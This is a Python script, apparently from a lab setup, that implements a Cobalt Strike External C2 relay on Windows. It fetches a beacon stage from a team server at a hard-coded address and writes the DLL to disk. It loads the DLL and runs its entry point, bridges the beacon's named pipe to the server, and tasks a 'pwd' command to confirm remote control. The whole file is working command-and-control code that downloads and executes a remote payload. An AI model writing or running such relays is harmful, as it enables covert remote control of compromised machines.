# -*- coding: utf-8 -*-
"""extc2_step4.py - strict-alternation relay with FULL frame logging
(every byte seen), fresh session, pwd task round-trip check."""
import ctypes
import re
import socket
import struct
import threading
import time

import win32file
import win32pipe

OUT = open(r"C:\Users\Public\extc2_step4.log", "w", encoding="utf-8")
PAYLOAD = r"C:\Users\Public\extc2_payload2.dll"
PIPENAME = r"\\.\pipe\B1ExtC2"
TS_ADDR = ("192.168.100.200", 2222)
R1LOG = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
         r"\p3-llvm-bench\tsboot_run\r1.log")
HEARTBEAT = b"\x00"


def log(m):
    OUT.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m))
    OUT.flush()
    print(m, flush=True)


k32 = ctypes.windll.kernel32
k32.LoadLibraryW.restype = ctypes.c_void_p
k32.LoadLibraryW.argtypes = [ctypes.c_wchar_p]


def ts_send(s, d):
    s.sendall(struct.pack("<I", len(d)) + d)


def ts_recv(s, timeout=20):
    s.settimeout(timeout)
    hdr = b""
    while len(hdr) < 4:
        c = s.recv(4 - len(hdr))
        if not c:
            raise EOFError("TS closed")
        hdr += c
    (n,) = struct.unpack("<I", hdr)
    buf = b""
    while len(buf) < n:
        c = s.recv(n - len(buf))
        if not c:
            raise EOFError("mid-frame")
        buf += c
    return buf


def main():
    s = socket.create_connection(TS_ADDR, timeout=10)
    log("ts connected")
    ts_send(s, b"arch=x64")
    ts_send(s, b"pipename=B1ExtC2")
    ts_send(s, b"go")
    payload = ts_recv(s, timeout=30)
    open(PAYLOAD, "wb").write(payload)
    log("stage %dB" % len(payload))

    base = k32.LoadLibraryW(PAYLOAD)
    assert base
    e = struct.unpack_from("<I", ctypes.string_at(base + 0x3C, 4))[0]
    entry_rva = struct.unpack_from("<I", ctypes.string_at(base + e + 24 + 0x10, 4))[0]
    entry = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_uint,
                               ctypes.c_void_p)(base + entry_rva)
    threading.Thread(target=lambda: entry(base, 4, None), daemon=True).start()
    ph = None
    for _ in range(60):
        time.sleep(0.5)
        try:
            ph = win32file.CreateFile(
                PIPENAME, win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                0, None, win32file.OPEN_EXISTING, 0, None)
            break
        except win32file.error:
            pass
    assert ph is not None, "pipe never appeared"
    win32pipe.SetNamedPipeHandleState(ph, win32pipe.PIPE_READMODE_MESSAGE, None, None)
    log("pipe connected")

    def rd_unit():
        hr, msg = win32file.ReadFile(ph, 1 << 20)
        if not msg:
            raise EOFError("closed")
        return msg

    def rd_frame():
        h4 = rd_unit()
        if h4 == HEARTBEAT or len(h4) != 4:
            return h4
        (n,) = struct.unpack("<I", h4)
        if n == 0:
            return b""
        buf = b""
        while len(buf) < n:
            hr, chunk = win32file.ReadFile(ph, 1 << 20)
            if not chunk:
                raise EOFError("mid-payload")
            buf += chunk
        return buf

    def peek(wait_s=0.5):
        end = time.time() + wait_s
        while time.time() < end:
            ok, avail, left = win32pipe.PeekNamedPipe(ph, 1)
            if avail:
                return rd_frame()
            time.sleep(0.02)
        return None

    meta = rd_frame()
    log("metadata %dB" % len(meta))
    ts_send(s, meta)

    p0 = len(open(R1LOG, encoding="utf-8", errors="replace").read())
    bid = None
    t0 = time.time()
    while time.time() - t0 < 30:
        seg = open(R1LOG, encoding="utf-8", errors="replace").read()[p0:]
        m = re.findall(r"INITIAL\t(\d+)", seg)
        if m:
            bid = m[-1]
            break
        time.sleep(1)
    if bid is None:
        log("NO INITIAL")
        return
    log("SESSION REGISTERED bid=%s" % bid)

    import sys
    sys.path.insert(0, r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench\tsboot_run")
    from tier3_common import send
    send("target", bid)
    time.sleep(2)
    p1 = len(open(R1LOG, encoding="utf-8", errors="replace").read())
    send("pwd", "")
    log("pwd tasked")

    # strict-alternation relay: answer EVERY ts frame promptly
    t0 = time.time()
    n_ts = n_b = 0
    pwd_seen = False
    while time.time() - t0 < 150:
        try:
            f = ts_recv(s, timeout=20)
        except socket.timeout:
            log("ts silent 20s")
            continue
        except (EOFError, OSError) as ex:
            log("ts ended: %s" % ex)
            break
        n_ts += 1
        log("ts->  %dB %s" % (len(f), f[:16].hex()))
        win32file.WriteFile(ph, struct.pack("<I", len(f)))
        if f:
            win32file.WriteFile(ph, f)
        # drain beacon side
        while True:
            u = peek(0.5)
            if u is None:
                break
            if u == HEARTBEAT:
                ts_send(s, u)
                n_b += 1
                break
            n_b += 1
            log("b->ts %dB %s" % (len(u), u[:16].hex()))
            ts_send(s, u)
        seg = open(R1LOG, encoding="utf-8", errors="replace").read()[p1:]
        if "Directory of" in seg:
            pwd_seen = True
            log("PWD OUTPUT SEEN")
            break
    log("DONE ts_frames=%d b_frames=%d pwd=%s" % (n_ts, n_b, pwd_seen))


if __name__ == "__main__":
    try:
        main()
    finally:
        OUT.close()
